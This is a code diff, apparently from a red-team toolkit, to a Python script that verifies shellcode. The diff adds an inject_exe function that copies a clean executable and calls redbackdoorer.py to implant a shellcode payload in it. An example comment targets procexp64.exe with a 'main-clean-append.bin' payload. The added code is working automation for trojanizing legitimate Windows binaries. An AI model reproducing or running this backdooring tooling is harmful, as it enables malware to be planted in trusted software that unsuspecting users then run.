@@ -2,7 +2,7 @@ import subprocess
 import os
 import pefile
 import time
-
+import shutil
 
 SHC_VERIFY_SLEEP = 0.1
 
@@ -189,3 +189,20 @@ def verify_shellcode(shc_name):
         os.remove(verify_filename)
     else:
         print("---> FAIL. Payload did not create file.")
+
+
+def inject_exe(shc_file, exe_in, exe_out):
+    print("--[ Injecting: shc {} into: {} -> {} ]".format(
+        shc_file, exe_in, exe_out
+    ))
+    shutil.copyfile(exe_in, exe_out)
+
+    # python3.exe .\redbackdoorer.py 1,1 main-clean-append.bin .\exes\procexp64-a.exe
+    subprocess.run([
+        "python3.exe",
+        "redbackdoorer.py",
+        "1,1",
+        shc_file,
+        exe_out
+    ], check=True,  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
